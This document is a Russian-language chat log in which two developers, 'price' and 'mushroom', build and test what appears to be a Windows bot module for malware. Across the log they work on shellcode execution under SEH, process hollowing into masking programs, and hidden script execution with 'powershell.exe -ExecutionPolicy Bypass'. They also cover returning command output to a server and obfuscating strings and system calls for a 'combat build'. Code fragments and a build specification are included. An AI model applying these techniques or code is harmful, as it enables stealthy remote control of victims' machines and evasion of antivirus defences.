2020-08-19 09:19:21.646529	price	mushroom	в смысле не знаю получается он или нет
2020-08-19 09:19:32.581255	mushroom	price	У меня Defender, а показывает РђРЅС‚РёРІРёСЂСѓСЃРЅР°СЏ РїСЂРѕРіСЂР°РјРј
2020-08-19 09:19:43.753871	price	mushroom	в смысле кодировка у тебя не правильная выходит?
2020-08-19 09:19:49.444733	mushroom	price	Кодировка наверное.
2020-08-19 09:19:57.123443	price	mushroom	я посмотрю
2020-08-19 09:20:03.704649	price	mushroom	у меня нормально все показывало
2020-08-19 09:20:16.495331	price	mushroom	и показывает, сейчас вылетает, я смотрю
2020-08-19 09:20:23.866974	mushroom	price	Может у тебя там только латинские символы.
2020-08-19 09:20:31.509242	price	mushroom	но главное, я SEH сделал!
2020-08-19 09:20:51.446930	price	mushroom	латинские буквы в utf8 как есть идут
2020-08-19 09:21:14.534765	price	mushroom	и вопрос возник по отработке шелкода
2020-08-19 09:21:18.135987	mushroom	price	А не латинские не идут.
2020-08-19 09:21:40.578047	price	mushroom	а у теб дефендер по русски написан?
2020-08-19 09:21:54.435835	price	mushroom	у тебя
2020-08-19 09:22:03.110388	mushroom	price	У меня нет. У тебя так получается в программе.
2020-08-19 09:22:15.440413	mushroom	price	Product name: └эЄштшЁєёэр  яЁюуЁрььр Microsoft Defender
2020-08-19 09:22:21.035422	mushroom	price	Это в логе.
2020-08-19 09:22:35.264439	price	mushroom	я посмотрю спасибо, у меня все переводится нормально и русские есть в выдаче данные
2020-08-19 09:22:50.966695	price	mushroom	чтото наверное на мою конфигурацию настроил
2020-08-19 09:22:54.021485	mushroom	price	Hollowing не работает ещё?
2020-08-19 09:22:58.829590	price	mushroom	пока нет
2020-08-19 09:23:03.409470	price	mushroom	просто экзе
2020-08-19 09:23:17.783337	mushroom	price	А запуск с сохранением на диск файла работает?
2020-08-19 09:23:26.744916	price	mushroom	да
2020-08-19 09:23:38.258388	mushroom	price	Запуск сценариев работает?
2020-08-19 09:23:42.615545	price	mushroom	и запускает и сохраняет и удаляет
2020-08-19 09:24:00.771315	price	mushroom	работает
2020-08-19 09:24:19.614508	mushroom	price	Что ещё можно проверять?
2020-08-19 09:24:26.682118	price	mushroom	не выложен только, я давно сделал а потом закоментировал, сейчас догоняю обратно
2020-08-19 09:24:40.426040	price	mushroom	подожди час
2020-08-19 09:24:46.953697	price	mushroom	я напишу что тестировать
2020-08-19 09:24:53.105889	price	mushroom	ну мож 2
2020-08-19 09:29:10.558909	mushroom	price	Что то cd c:\\r\ndir\r\n сценарий bat без сохранения на диск не сработал (ответа нету на команду).
2020-08-19 09:29:47.187235	price	mushroom	там закоментировано, но все написано, через пару часов выложу
2020-08-19 09:30:09.609195	mushroom	price	Значит сценарии не смотрю пока.
2020-08-19 09:30:41.049248	price	mushroom	пока не смотри ничего, чтобы сразу посмотреть так уж посмотреть
2020-08-19 09:30:46.940517	mushroom	price	А с сохранением работают сценарии?
2020-08-19 09:31:03.465200	price	mushroom	все работает через файл и через пайпы
2020-08-19 09:31:32.904109	price	mushroom	это одна ветка выработки имени файла и сохранения байтов по этому имени и потом удаление
2020-08-19 09:31:42.499812	mushroom	price	Хорошо. Давай приводи в рабочее состояние и я посмотрю тогда.
2020-08-19 09:31:49.753182	price	mushroom	работает для bat, ps,exe,dll
2020-08-19 09:31:57.475447	price	mushroom	да, привожу
2020-08-19 09:32:08.897326	price	mushroom	вот шелкод ты скидывал, он рабочий?
2020-08-19 09:33:24.549907	mushroom	price	Только для 32 битной программы, показывает окно.
2020-08-19 09:33:45.067341	price	mushroom	и надо нажимать а он сам не завершается?
2020-08-19 09:34:13.078558	price	mushroom	как тогда ведет себя наш программный аппарат?
2020-08-19 09:34:14.142968	mushroom	price	После завершения его ошибка, для x64 сразу ошибка, как раз можно проверить отлов исключения с помощью SEH.
2020-08-19 09:34:19.422142	price	mushroom	сразу уходит
2020-08-19 09:34:40.379655	mushroom	price	В окне надо нажать OK.
2020-08-19 09:34:41.538098	price	mushroom	если нажать - то исключение получается?
2020-08-19 09:34:53.900609	mushroom	price	В x64 сразу ошибка будет.
2020-08-19 09:35:22.947232	mushroom	price	Исключение там в любом случае будет. Можно закрыть как только окно закроется.
2020-08-19 09:35:30.727031	price	mushroom	я  шелкод тредом запускаю, чтоб СЕХ работал,  у меня ждать будет пока не нажмёшь?
2020-08-19 09:35:48.679566	mushroom	price	Там стек не востанавливается после выполнения шелл кода.
2020-08-19 09:35:55.687723	price	mushroom	и плевать
2020-08-19 09:36:07.126197	price	mushroom	я весь тред грохаю
2020-08-19 09:36:15.603040	price	mushroom	в сехе
2020-08-19 09:36:35.753214	price	mushroom	посмотришь, может понравится
2020-08-19 09:38:07.526929	price	mushroom	валится стало, незаметно перешел на рилиз и там стек маленький, вызывает исключение
2020-08-19 09:38:11.835072	price	mushroom	сейчас поправлю
2020-08-19 09:38:17.192960	price	mushroom	вот на это и нужно врремя
2020-08-19 09:39:06.535352	mushroom	price	OK.
2020-08-19 09:56:27.792913	price	mushroom	так у тебя же дальше про сеть по русски пишет!
2020-08-19 09:56:30.276861	price	mushroom	Системная ошибка 6118.
2020-08-19 09:56:56.812759	price	mushroom	а это все одной строкой кодируется декодируется
2020-08-19 09:57:10.171212	price	mushroom	ок,,  посмотрю повнимательнее
2020-08-19 09:57:28.419214	price	mushroom	может отдельная обработка есть на ативиры
2020-08-19 10:03:48.966886	price	mushroom	зайди в бот 57396fd3c3f052de4c8d0ceb1dfa32db,  там я русские буквы подставил и они нормально напечатались, посоветуй где искать
2020-08-19 10:05:14.090054	price	mushroom	оставлю русскую вставку для отладки, чтобы ты у себя запустил впоследствии
2020-08-19 10:27:02.476989	mushroom	price	Вот тут наверное антивирус портиться кодировка:
hr = PtrProduct->get_ProductName(&PtrVal);
        if (FAILED(hr)) {debug_printf(L"get_ProductName failed with error: 0x%d\n", hr);
            goto exit;
        }
        debug_printf(L"\nProduct name: %s\n", PtrVal);
        int ilen = lstrlenW(PtrVal);
        UNICODE2char(PtrVal, productName, ilen);
        productName[ilen] = 0;
2020-08-19 10:28:00.222759	price	mushroom	Да, я в юникоде получаю и транслирую в мультибайт
2020-08-19 10:28:23.665981	price	mushroom		 WideCharToMultiByte(CP_UTF8, WC_DEFAULTCHAR, unicode, ilen, (LPSTR)onebyte, ilen, NULL, NULL);
2020-08-19 10:29:15.693584	price	mushroom	onebyte - это оно
2020-08-19 10:29:22.597045	price	mushroom	что не так?
2020-08-19 10:29:36.059945	price	mushroom	и главное она у меня везде используется
2020-08-19 10:30:05.086584	mushroom	price	Product name: └эЄштшЁєёэр  яЁюуЁрььр Microsoft Defender
2020-08-19 10:30:30.436187	price	mushroom	это факт
2020-08-19 10:30:38.070667	mushroom	price	Ищи где ты выводишь эту строку.
2020-08-19 10:30:49.463377	price	mushroom	debug_printf(L"\nProduct name: %s\n", PtrVal);
2020-08-19 10:31:15.510003	price	mushroom	может %ls поставить?
2020-08-19 10:31:21.644464	mushroom	price	Может там она 866
2020-08-19 10:31:27.292319	mushroom	price	Или 1251
2020-08-19 10:31:42.198795	price	mushroom	%ls?
2020-08-19 10:32:32.044490	mushroom	price	Нет.
2020-08-19 10:32:37.246935	price	mushroom	вот почему она дальше это гонит в таком виде?
2020-08-19 10:32:46.532657	price	mushroom	понял -нет
2020-08-19 10:33:26.176472	price	mushroom	а как узнать в каком она там виде?
2020-08-19 10:33:26.869512	mushroom	price	PtrVal кодировка какая то не правильная.
2020-08-19 10:33:51.249759	mushroom	price	Еслм латинсик нормально а русские нет.
2020-08-19 10:33:57.204876	price	mushroom	это вообще из системы дает PtrProduct->get_ProductName(&PtrVal);
2020-08-19 10:34:20.051586	price	mushroom	я его не трогаю
2020-08-19 10:34:35.726679	price	mushroom	может принудительно гнать в 1251
2020-08-19 10:34:39.023299	price	mushroom	?
2020-08-19 10:34:45.415308	price	mushroom	я могу
2020-08-19 10:36:12.064307	price	mushroom	ок,  пришлю посмотришь, думаю русские придут
2020-08-19 10:36:14.048893	price	mushroom	буквы
2020-08-19 10:38:17.068130	mushroom	price	Вот так это выглядит в юникод:
L"Антивирусная программа Microsoft Defender"
2020-08-19 10:38:23.947592	mushroom	price	Это PtrVal
2020-08-19 10:38:36.525888	mushroom	price	Потом это портиться, ищи где.
2020-08-19 10:39:09.368292	price	mushroom	прямо в моём коде такое?
2020-08-19 10:39:14.692435	mushroom	price	Это портиться здесь: UNICODE2char(PtrVal, productName, ilen);
2020-08-19 10:39:26.139655	mushroom	price	В отладчике сейчас прогнал.
2020-08-19 10:39:47.306109	mushroom	price	productName крякозябры.
2020-08-19 10:39:47.619690	price	mushroom	WideCharToMultiByte(CP_UTF8, WC_DEFAULTCHAR, unicode, ilen, (LPSTR)onebyte, ilen, NULL, NULL); , это CP_UTF8 портит
2020-08-19 10:41:21.216267	mushroom	price	Пример:
_Success_(return != 0)
BOOL wideCharToUtf8(_In_reads_(wcsSize) PCWSTR wcs, _In_ int wcsSize, _Outptr_ PSTR* utf8Str,
    _Out_ int* utf8StrSize)
{
    int cb = WideCharToMultiByte(CP_UTF8, 0, wcs, wcsSize, NULL, 0, NULL, NULL);
    PSTR result = (PSTR)HeapAlloc(GetProcessHeap(), 0, cb);
    if (!result)
        return FALSE;

    cb = WideCharToMultiByte(CP_UTF8, 0, wcs, wcsSize, result, cb, NULL, NULL);

    *utf8Str = result;
    *utf8StrSize = cb;
    return TRUE;
}
2020-08-20 09:03:46.356842	mushroom	price	Ну что. Можно смотреть?
2020-08-20 11:32:45.822067	price	mushroom	смотри
2020-08-20 11:33:07.939724	price	mushroom	exe и dll работают
2020-08-20 11:36:46.646782	price	mushroom	nltest обнаружил, что x64 работает, а х86 почему то не находит файл, да и дебагер olly или  PE explorer, если вызвать этот файл не берут его.
2020-08-20 11:37:30.054810	price	mushroom	ещё странно что .bat dir выдает, а whoami пишет, что нет такой команды
2020-08-20 11:38:27.349256	price	mushroom	ещё странно,  что .ps1 выдает какой-то странный текст обратно, хотя такая же обработка .bat - всё в порядке с кодировкой
2020-08-20 11:39:41.997025	price	mushroom	я вокруг этих ошибок часов 5 крутился с утра, безуспешно
2020-08-20 11:42:53.958580	price	mushroom	ещё натестировал, что если собираю х64 релиз, то почемму-то генерится х86 релиз, вот сразу посмотри это самое простое-как у тебя генерится. У меня для каждой сбборки поддставляются в имя  суффиксы - r/d 86/64
2020-08-20 11:48:57.254748	mushroom	price	Попозже гляну.
2020-08-20 11:49:25.141693	price	mushroom	давай, я как раз проснулся
2020-08-20 12:36:49.516467	mushroom	price	ещё натестировал, что если собираю х64 релиз, то почемму-то генерится х86 релиз, вот сразу посмотри это самое простое-как у тебя генерится. У меня для каждой сбборки поддставляются в имя  суффиксы - r/d 86/64
2020-08-20 12:37:06.329350	mushroom	price	Пересоздай проект просто по новой.
2020-08-20 12:37:20.072517	mushroom	price	Вернее решение.
2020-08-20 12:37:26.793995	mushroom	price	Назови его bd6.
2020-08-20 12:37:41.402991	mushroom	price	Добавь туда файлы свои.
2020-08-20 12:38:09.991081	mushroom	price	Создавай пустой проект.
2020-08-20 12:38:19.385652	mushroom	price	Там сразу бдет x86\x64
2020-08-20 12:38:45.390346	price	mushroom	а что со старым случилось?
2020-08-20 12:39:21.332303	mushroom	price	Не знаю. Он у тебя странный какой то. Только debug был Win32.
2020-08-20 12:39:26.684779	mushroom	price	Как ты его создавал.
2020-08-20 12:39:34.597376	price	mushroom	у меня ещё более старый был, он совсем испортился -при старте открывает консоль и пишет что нет ntoskrnl.exe
2020-08-20 12:39:56.574832	mushroom	price	ОФОРМЛЕНИЕ МОДУЛЯ
1. Должен иметься проект Microsoft Visual Studio версии не ниже 2015.
2. Проект Visual Studio должен быть настроен следующим образом:
* Для ВСЕХ профилей сборки:
- выходной каталог: $(SolutionDir)bin\$(PlatformTarget)\$(Configuration)\
- Промежуточный каталог: $(SolutionDir)obj\$(Platform)\$(Configuration)\$(ProjectName)\
- Многопроцессорная компиляция: да
* Профиль Release:
- Формат отладочной информации (С/С++ общие): нет
- Создавать отладочную информацию (компоновщик/отладка): нет
3. Строки обфусцировать библиотекой Andrivet (приложена, см.макрос _STR())
4. Системные вызовы обфусцировать библиотекой GetApi.h. Быть внимательным, обфускация сисвызовов может давать падения.
5. Модуль должен иметь две версии - x32- и x64-разрядную.
6. В боевой сборке должны быть обфусцированы по максимуму строки, отключен всяческий отладочный вывод.
7. Модуль должен иметь отладочную версию. Отладочный вывод должен выводиться в c:/temp/modulename.log (путь к логу настраивается в макросе).
Каждая запись лога должна содержать временнУю метку с точностью до секунды.
8. В проекте должен быть файл настроек config.h (название неважно, важна суть - здесь все глобальные настройки - пути, макросы-переключатели условной компиляции итд).
9. Модуль должен работать на всех современных версиях Windows.
   Минимальная поддерживаемая версия Windows - Windows XP (если невозможно - Windows Vista).
10. Дополнительно к компоновке должен добавляться файл notelemetry.obj (https://stackoverflow.com/questions/37761768/how-to-prevent-visual-studio-2015-update-2-to-add-telemetry-main-invoke-trigger)
2020-08-20 12:40:04.884403	mushroom	price	Так его настрой.
2020-08-20 12:40:09.908195	mushroom	price	Проект.
2020-08-20 12:40:24.150130	price	mushroom	ок
2020-08-20 12:40:38.002154	mushroom	price	Обфусцирование и т.д. не нужно пока.
2020-08-20 12:41:14.497681	price	mushroom	а по ошибкам? что там может быть?
2020-08-20 12:41:33.525215	mushroom	price	То есть пункты 1, 2, 5, 7 реализуй.
2020-08-20 12:41:43.516217	price	mushroom	без углубления, чтобы тебя не грузить
2020-08-20 12:41:55.291492	mushroom	price	По каким whoami не находит?
2020-08-20 12:42:06.185662	mushroom	price	cmd /c whoami пробовал?
2020-08-20 12:42:55.563317	price	mushroom	если я ставлю /с (этим уже давно страдаю) даже dir не выдает, убираю-выдает
2020-08-20 12:43:23.136851	mushroom	price	Это ты где так делаешь?
2020-08-20 12:43:28.513992	price	mushroom	с /с пустая строка, без /с - не найдена команда
2020-08-20 12:43:38.312515	price	mushroom	в createprocess
2020-08-20 12:43:42.777743	price	mushroom	cmdline
2020-08-20 12:43:50.766229	price	mushroom	launcher
2020-08-20 12:44:12.871770	price	mushroom	            lstrcpyA(cmdline, icommand == 12 ? "cmd.exe " : "powershell.exe -ExecutionPolicy Bypass -Command -");
2020-08-20 12:44:33.181100	price	mushroom	   if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, 0, BOTenvironment, NULL, (LPSTARTUPINFOA)&si, &pi)) {
2020-08-20 12:45:00.821460	mushroom	price	BOTenvironment замени на NULL
2020-08-20 12:45:05.572855	price	mushroom	причем когда отлаживал тему, всё работало
2020-08-20 12:45:09.186841	price	mushroom	кроме /с
2020-08-20 12:45:15.478892	price	mushroom	вотвот
2020-08-20 12:45:19.274829	mushroom	price	Процесс и так наследует от родительского все переменные
2020-08-20 12:45:27.480860	price	mushroom	а как тогда переменную окружения передавать?
2020-08-20 12:45:44.469552	price	mushroom	или просто устанавливать?
2020-08-20 12:45:53.270407	mushroom	price	Они наследуются от родительского.
2020-08-20 12:45:55.573476	price	mushroom	SET&
2020-08-20 12:45:58.855673	price	mushroom	?
2020-08-20 12:46:10.990051	price	mushroom	а в родительские как?
2020-08-20 12:46:22.499799	mushroom	price	В прграмме просто сделай SetEnvironmentVariable
2020-08-20 12:49:22.339432	mushroom	price	/c не нужно использовать если через пайп пишешь сценарий
2020-08-20 12:49:45.588033	mushroom	price	Если чере пайп пишешь всегда на конце каждой команды надо \r\n
2020-08-20 12:50:12.274068	price	mushroom	я и не делал
2020-08-20 12:50:22.945541	price	mushroom	а перевод каретки ставил
2020-08-20 12:50:28.541670	mushroom	price	whoami\r\n
2020-08-20 12:50:42.727294	price	mushroom	а с файлом, что нужно?
2020-08-20 12:50:55.518071	mushroom	price	Запусти процесс cmd.exe и напиши в пайп whoami\r\n
2020-08-20 12:52:02.249479	price	mushroom	заработало! с пайпом
2020-08-20 12:52:15.196640	price	mushroom	а с дампом в файл -нужно делать?
2020-08-20 12:52:37.896588	price	mushroom	странностей гораздо уменьшилось
2020-08-20 12:53:02.962683	mushroom	price	BOTenvironment после того как это убрал?
2020-08-20 12:53:16.223322	price	mushroom	да
2020-08-20 12:53:42.844627	price	mushroom	и поставил	SetEnvironmentVariableA("VERS=", hexHashID);
2020-08-20 12:53:48.604410	mushroom	price	Вот значит ты системные переменные портил, вот и не находилось что нужно.
2020-08-20 12:54:12.523577	mushroom	price	А теперь они наследуются от твоей прогаммы.
2020-08-20 12:54:34.984881	price	mushroom	и у PS стал нормальный шрифт!!!
2020-08-20 12:54:48.872103	price	mushroom	гружу успех на гитлаб
2020-08-20 12:55:53.016517	price	mushroom	жалко ты по ночам спишь
2020-08-20 12:56:55.516149	mushroom	price	Проект оформи.
2020-08-20 12:57:03.012379	mushroom	price	По нормальному.
2020-08-20 12:57:11.868775	price	mushroom	да, сделаю
2020-08-20 12:57:38.698426	price	mushroom	в смысле как ты накопировал повыше?
2020-08-20 12:57:54.806671	price	mushroom	требования по оформлению?
2020-08-20 12:58:07.143670	mushroom	price	Да. Создай пустой проект C++ и туда файлы свои добавь и настрой как я писал выше.
2020-08-20 12:58:16.542089	mushroom	price	Название проекта и решения bd6
2020-08-20 12:58:32.388949	mushroom	price	SetEnvironmentVariable("VERS"), env);
2020-08-20 12:58:48.456177	mushroom	price	Без =
2020-08-20 12:59:00.800095	price	mushroom	и без скобки
2020-08-20 12:59:34.633720	mushroom	price	SetEnvironmentVariable(TEXT("VERS"), env);
2020-08-20 12:59:41.858109	mushroom	price	Опечатка.
2020-08-20 13:00:05.690325	price	mushroom	ок
2020-08-20 13:00:40.463923	mushroom	price	Это универсальная версия с TEXT и без суффикса A или W.
2020-08-20 13:01:30.788102	price	mushroom	понимаю.
2020-08-20 13:07:20.828532	mushroom	price	По поводу того что nltest нету на x86 значит отправляй то что выведется или код ошибки GetLastError. Там где вывод в нормальном ситуации.
2020-08-20 13:07:56.685863	price	mushroom	ok, а ты у себя попробуешь? чтоб я знал
2020-08-20 13:08:16.518071	mushroom	price	Я попробовал запустить nltest в powershell x86
2020-08-20 13:08:22.828635	mushroom	price	Нету такой программы.
2020-08-20 13:08:32.590685	price	mushroom	то есть так же
2020-08-20 13:09:49.000048	mushroom	price	Вообще какие ошибки при запуске процесса, код ошибки в ответе на эту команду надо посылать. Получается PID 0 Msg <Код ошибки>
2020-08-20 13:10:19.254880	mushroom	price	pid=1234
stdout and stderr here

Если произошла ошибка запуска, в качестве идентификатора отдается 0 (ноль), и следующей строкой идет сообщение об ошибке.
2020-08-20 13:10:34.932642	mushroom	price	Вот так в ТЗ написано.
2020-08-20 13:10:35.157602	price	mushroom	ok
2020-08-20 13:10:51.591349	price	mushroom	как раз сейчас ответ на Терминате посылаю
2020-08-20 13:35:32.666924	price	mushroom	сделал Terminate на несуществующий процесс. Система вот так восприняла мой ответ:PID_0_Msg_87:
2020-08-20 13:35:52.114421	price	mushroom	может она просит текстового расширения диагностики?
2020-08-20 13:38:05.622792	mushroom	price	5.4. Ответ на команду 15 об остановке процесса
В качестве ответа возвращается результат выполнения GetLastError() сразу после выполнения TerminateProcess()
в виде десятичного числа
2020-08-20 13:38:16.337984	mushroom	price	Просто цифра.
2020-08-20 13:38:43.881686	mushroom	price	Не надо писать PID и т.д.
2020-08-20 13:38:53.706543	price	mushroom	ок
2020-08-21 09:07:21.424119	mushroom	price	Привет. Посмотрел сейчас то что в GitLab
2020-08-21 09:07:30.048208	mushroom	price	Информация о системе нормально работает.
2020-08-21 09:07:37.328129	mushroom	price	Hollowing не работает.
2020-08-21 09:07:39.700766	price	mushroom	привет
2020-08-21 09:07:42.117012	price	mushroom	спасибо
2020-08-21 09:07:50.567491	price	mushroom	да, я над ним работаю
2020-08-21 09:08:16.850498	price	mushroom	там в инфо я два запроса пока отрубил, в отладке не хватает терпения 2 минуты ждать
2020-08-21 09:08:45.169328	mushroom	price	Запуск с сохранением на диск работает так что ответ приходит раньше таймаута, то есть процесс раньше завершается чем должен наверное, файл не удаляется.
2020-08-21 09:08:45.849080	price	mushroom	сейчас ещё логирование изучаю, хочу внедрить
2020-08-21 09:09:07.389416	mushroom	price	bat без сохранения на диск работает правильно.
2020-08-21 09:09:14.671303	price	mushroom	#define  debug_logA(fmt, ...)  {wprintfA(fmt, __VA_ARGS__);wfprintf(_LOG_FILE,fmt, __VA_ARGS__)}
2020-08-21 09:09:19.365291	mushroom	price	bat с сохранением на диск не правильно.
2020-08-21 09:09:27.355443	price	mushroom	понял
2020-08-21 09:09:32.976916	mushroom	price	Вывод у них разный получился, а должен быть один.
2020-08-21 09:09:47.113535	mushroom	price	ps1 без сохранения на диск падает.
2020-08-21 09:09:54.607177	price	mushroom	подольше подольше подождать?
2020-08-21 09:10:02.928067	mushroom	price	ps1 с сохранением на диск падает.
2020-08-21 09:10:17.162000	mushroom	price	Программа падает. когда ps1
2020-08-21 09:10:24.167981	price	mushroom	понял
2020-08-21 09:10:31.988910	mushroom	price	Шелл код падает программа тоже.
2020-08-21 09:10:51.811309	price	mushroom	странно, я ночью норм запускал
2020-08-21 09:11:07.352120	price	mushroom	посмотрю на твоем шелле
2020-08-21 09:11:29.586720	price	mushroom	а какой скрипт на ps1?
2020-08-21 09:11:29.914714	mushroom	price	Я как раз свой и запускал, который не предназначен для x64
2020-08-21 09:11:47.140094	mushroom	price	ps1 скрипт простой cd c:\\r\ndir\r\n
2020-08-21 09:11:55.347137	mushroom	price	Для bat такой же.
2020-08-21 09:12:04.171890	price	mushroom	я твой не запускал, только 90 90 c3
2020-08-21 09:12:35.431165	price	mushroom	у себя я этот dir запускал нормально, посмотрю конечно
2020-08-21 09:13:08.413264	mushroom	price	Программа должна не падать даже если там мусорный какой нибудь шелл код запускать. Для этого и есть SEH, я тебе пример давал.
2020-08-21 09:13:30.483686	price	mushroom	я seh только на shellcode поставил
2020-08-21 09:13:42.549920	mushroom	price	Скрипт именно 2 команды cd c:\\r\ndir\r\n
2020-08-21 09:13:42.598331	price	mushroom	думал и теперь поставлю везде
2020-08-21 09:13:54.850016	mushroom	price	Чтобы вывело содержимое c:\
2020-08-21 09:14:04.454448	price	mushroom	этого не было у меня-только dir
2020-08-21 09:14:16.666556	mushroom	price	Не надо везьде SEH только там где запускается шелл код.
2020-08-21 09:14:39.293715	price	mushroom	я думал на bat/ps1/exe/dll тоже надо
2020-08-21 09:15:32.272900	price	mushroom	на шеле стоит seh, я тестировал на некорректном shellcode
2020-08-21 09:15:43.211444	mushroom	price	Там не надо. Там всё проверяется по коду возврата и GetLastError.
2020-08-21 09:16:14.799808	price	mushroom	тогда что значит падает bat/ps1
2020-08-21 09:16:26.270665	mushroom	price	ps1 только падает.
2020-08-21 09:16:27.809781	price	mushroom	просто не выполняется
2020-08-21 09:16:35.599475	mushroom	price	Падает программа.
2020-08-21 09:16:45.981256	price	mushroom	понял, вылетает
2020-08-21 09:16:51.803591	mushroom	price	Исключение.
2020-08-21 09:16:58.659625	price	mushroom	тогда надо наверное seh
2020-08-21 09:17:22.267860	mushroom	price	Не надо. Это ошибка у тебя там где то.
2020-08-21 09:17:37.004445	mushroom	price	SEH только для шелл кода.
2020-08-21 09:17:59.986716	price	mushroom	хорошо посмотрю, я работаю по всему ТЗ на бумажке. У меня минусы расставлены везде и я их на плюсы меняю.
2020-08-21 09:18:42.431230	price	mushroom	в howlinge есть какие-то проблемы, или по образцу можно легко сделать?
2020-08-21 09:19:16.968237	price	mushroom	я текст смотрел, но его много. Ну и принцип знаю, но не реализовывал ещё.
2020-08-21 09:19:23.948389	mushroom	price	В общем так проверяй как сделаешь. Hollowing для всех маскирующих программ запусти, запусти процесс с сохранением на диск, bat cd c:\\r\ndir\r\n, ps1 cd c:\\r\ndir\r\n
2020-08-21 09:19:41.389034	price	mushroom	блин даже не вспомнил правильно -Холовинг
2020-08-21 09:19:53.225024	price	mushroom	ок, работаю
2020-08-21 09:19:57.825297	mushroom	price	По примеру который я тебе давал hollowing.
2020-08-21 09:20:09.737927	price	mushroom	буквально?
2020-08-21 09:20:38.242535	price	mushroom	холовинг-долюёжка, выдалюливание, я путаю всегда с хоулингом-завывание
2020-08-21 09:20:58.504629	price	mushroom	ю=б
2020-08-21 09:21:27.840528	mushroom	price	Нет не буквально копировать в ставить. Для себя подправь что надо. Принцип создал процесс приостановленный, подменил его образ на свой, возобновил главный поток процесса.
2020-08-21 09:22:23.253213	price	mushroom	принцип знаю, не знаю, но скоро узнаю, эту реализацию
2020-08-21 09:22:23.720831	mushroom	price	Там в коде всё прокомментированно.
2020-08-21 09:22:29.741536	price	mushroom	ок
2020-08-21 09:22:41.806860	mushroom	price	В общем так проверяй как сделаешь. Hollowing для всех маскирующих программ запусти, запусти процесс с сохранением на диск, bat cd c:\\r\ndir\r\n, ps1 cd c:\\r\ndir\r\n
2020-08-21 09:22:54.456783	price	mushroom	хорошо
2020-08-21 09:23:01.364364	mushroom	price	Как это всё будет работать пиши мне, тогда я посмотрю.
2020-08-21 09:23:08.511979	price	mushroom	ок
2020-08-21 09:23:16.163241	mushroom	price	И проект не забудь оформить как я вчера писал.
2020-08-21 09:23:37.181742	price	mushroom	я оформил, кроме название солюшена
2020-08-21 09:23:59.084990	price	mushroom	в лоб не меняется, а переносить уу меня времени не хватило
2020-08-21 09:24:00.852531	mushroom	price	Он на GitLab?
2020-08-21 09:24:06.302329	price	mushroom	директории и опции все поставил
2020-08-21 09:24:09.151748	price	mushroom	да
2020-08-21 09:24:22.762949	price	mushroom	может там и бат с пс1 заработает
2020-08-21 09:24:33.495092	price	mushroom	я интенсивно сейчас правил и сбрасывал
2020-08-21 09:24:36.328249	price	mushroom	но ночью
2020-08-21 09:24:45.124110	mushroom	price	Нет. Я сейчас брал последнее что есть.
2020-08-21 09:24:46.160007	price	mushroom	с 3до 7 утра
2020-08-21 09:25:00.786505	price	mushroom	значит хуже дело, посмотрю
2020-08-21 09:25:15.297617	price	mushroom	но директории то я точно поправил
2020-08-21 09:25:28.944903	price	mushroom	bin/x86/debug or release
2020-08-21 09:27:08.269916	mushroom	price	Проект переделай всё равно, всё равно, как я говорил, по новой файлы скопируй туда в пустой проект просто.
2020-08-21 09:28:18.079235	mushroom	price	Я тебе дам программы для проверки hollowing, test не нужны будут.
2020-08-21 09:30:20.522429	price	mushroom	хорошо, давай
2020-08-21 09:30:24.005423	mushroom	price	Download: https://qaz.im/load/9erYBN/B3nZ76   
Delete: https://qaz.im/index.php?a=delete&q=2095280175
Пароль: 123
2020-08-21 09:30:40.167772	mushroom	price	Бесконечно выводит TestOutput
2020-08-21 09:31:07.506685	mushroom	price	Сценарии я выше написал, шелл код у тебя есть.
2020-08-21 09:31:17.829128	price	mushroom	принял удалил
2020-08-21 09:32:39.582436	price	mushroom	а что такое U C?
2020-08-21 09:32:52.825243	price	mushroom	не могу догадаться, юникод?
2020-08-21 09:33:30.039194	mushroom	price	U юникод, C консольное приложение.
2020-08-21 09:34:05.532167	price	mushroom	а без С, GUI?
2020-08-21 09:34:26.684352	mushroom	price	Да, но без окна.
2020-08-21 09:34:37.671161	price	mushroom	ок
2020-08-21 09:34:49.929006	mushroom	price	/SUBSYSTEM:WINDOWS
2020-08-21 09:34:59.531430	price	mushroom	это понятно
2020-08-21 09:35:00.611721	mushroom	price	/SUBSYSTEM:CONSOLE
2020-08-21 09:44:11.818859	mushroom	price	Download: https://qaz.im/load/yrDB9a/Yi22dn   
Delete: https://qaz.im/index.php?a=delete&q=1266551332
Пароль: 123
2020-08-21 09:44:17.630730	mushroom	price	dll тестовое
2020-08-21 09:44:34.558900	price	mushroom	ок
2020-08-21 09:44:37.271107	mushroom	price	запускается так rundll32.exe TestOutput32.dll,Run
2020-08-21 09:44:47.920830	mushroom	price	Например для 32 битного.
2020-08-21 09:44:53.363114	price	mushroom	исчерпывающая инструкция
2020-08-21 09:44:53.395463	mushroom	price	Показывает окно.
2020-08-21 09:46:03.731069	mushroom	price	В команде в Parameters Run укажешь.
2020-08-21 09:46:28.551096	price	mushroom	да, я в курсе
2020-08-21 09:46:44.454769	price	mushroom	я свои тесты написал и тестировал уже
2020-08-21 09:49:36.541309	mushroom	price	У testoutput типа такой вывод:
Startup info
Desktop: Winsta0\Default
Title: Microsoft.Windows.Explorer
X: 0
Y: 0
XSize: 0
YSize: 0
XCountChars: 0
YCountChars: 0
FillAttribute: 2876548156
Flags: 257
ShowWindow: 0
StdInput: FFFFFFFFFFFFFFFF
StdOutput:
0000000000001BB0
StdError: 0000000000001B0C

Standard output: 0000000000001BB0
Standard error: 0000000000001B0C

Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test
output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test
output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test
output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
2020-08-21 09:49:51.148431	mushroom	price	Это с таймаутом 60 сек.
2020-08-21 09:49:51.316509	price	mushroom	уже получил
2020-08-21 09:50:15.626461	mushroom	price	Вот у тебя с сохранением на диск вывод был гораздо меньше.
2020-08-21 09:50:17.375937	price	mushroom	даже пришлось через таскменеджер убивать
2020-08-21 09:50:42.005392	price	mushroom	так у меня однократная печать, без цикла
2020-08-21 09:51:10.815107	mushroom	price	А должен был 60 секунд работать.
2020-08-21 09:51:18.482454	price	mushroom	кстати а как поступать с такими программами
2020-08-21 09:51:27.356125	mushroom	price	И то что вывелось за это время отправить на сервер.
2020-08-21 09:51:28.537176	price	mushroom	после таймацта терминалить?
2020-08-21 09:51:40.926523	mushroom	price	Да. То что вывелось на сервер.
